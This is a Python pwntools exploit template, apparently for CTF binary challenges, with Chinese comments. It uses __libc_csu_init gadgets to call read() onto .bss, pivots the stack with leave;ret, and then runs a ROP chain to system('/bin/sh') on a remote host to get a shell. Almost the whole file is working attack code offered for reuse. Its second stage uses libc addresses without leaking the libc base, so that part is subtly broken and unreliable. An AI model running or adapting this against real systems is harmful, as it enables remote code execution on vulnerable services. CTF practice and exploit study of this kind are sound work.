#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: ret2csu + 栈迁移模板 —— __libc_csu_init 尾部 gadget 控 rdx/rsi/edi 调函数,
     再用 leave;ret 把栈迁到 bss 上执行更长的 ROP 链
适用条件:
    - 64 位, glibc <= 2.33 (__libc_csu_init 存在; 2.34 起该函数被移除)
    - 溢出长度不够放完整 ROP(比如只够 0x30 字节), 或需要控 rdx 调 read/write
用法:
    1) 改 CONFIG 区: gadget 地址(ROPgadget --binary ./pwn | grep "pop rbx" 找 csu_pop,
       csu_pop 地址 = csu_call 地址 + 0x9 一般)
    2) OFFSET / 提示符按题目改
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
LIBC_PATH = "./libc.so.6"   # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
OFFSET = 0x18               # TODO: 改这里: 溢出到返回地址字节数(栈迁移题通常很短)
CSU_POP = 0x4008CA          # TODO: 改这里: pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret
CSU_CALL = 0x4008B0         # TODO: 改这里: mov rdx,r13;mov rsi,r14;mov edi,r15d;call [r12+rbx*8]
LEAVE_RET = 0x4006B0        # TODO: 改这里: leave; ret
BSS = 0x601100              # TODO: 改这里: 可写 bss 地址(迁移目的地, 取 .bss 中部对齐处)
# =============================================================

context.arch = "amd64"
context.log_level = "info"
elf = ELF(BINARY, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def csu_call(func_ptr_addr, edi, rsi, rdx, new_rbp):
    """拼一段 csu: pop rbx=0,rbp=1,r12=函数指针,r13=rdx,r14=rsi,r15=edi
    -> call [r12+rbx*8] -> rbx+1==rbp 跳出循环 -> 尾部再 pop 一轮(借机设置新 rbp)"""
    payload = p64(CSU_POP)
    payload += p64(0) + p64(1)                  # rbx=0, rbp=1 (循环条件)
    payload += p64(func_ptr_addr)               # r12: call [r12 + rbx*8]
    payload += p64(rdx) + p64(rsi) + p64(edi)   # r13=rdx, r14=rsi, r15=edi(gadget 只取 r15d)
    payload += p64(CSU_CALL)
    # 尾部: add rsp,8 + pop rbx,rbp,r12,r13,r14,r15 共 7*8 字节, 第 3 槽塞新 rbp
    payload += p64(0) * 2 + p64(new_rbp) + p64(0) * 4
    return payload


def pwn():
    io = start()

    # ---- 第一步: csu 调 read(0, BSS, 0x200) 把第二段 ROP 写到 bss ----
    payload = b"a" * OFFSET
    # edi 参数走 r15d 只有 32 位, read 的 fd=0 没问题
    payload += csu_call(elf.got["read"], 0, BSS, 0x200, BSS)
    payload += p64(LEAVE_RET)   # read 回来后 leave;ret: rsp=BSS, eip=[BSS+8]

    io.sendlineafter(b">", payload)   # TODO: 改这里: 提示符

    # ---- 第二步: 写到 bss 的第二段链 ----
    # leave;ret 过程: mov rsp,rbp(=BSS) -> pop rbp(吃掉链首 8 字节) -> ret 到 [BSS+8]
    rop2 = p64(0xDEAD0000)      # 链首 8 字节给 pop rbp 吃掉, 随便填
    if LIBC_PATH:
        # TODO: 改这里: 0x401234 换成 pop rdi; ret 的地址
        rop2 += p64(0x401234) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.symbols["system"])
    else:
        # 无 libc: csu 再调一遍 puts 泄露 got 后回 main 重打, 这里留示意
        rop2 += csu_call(elf.got["puts"], elf.got["puts"], 0, 0, 0) + p64(elf.symbols["main"])

    io.send(rop2)   # read 收到数据即返回, 无需补满
    io.interactive()


if __name__ == "__main__":
    pwn()
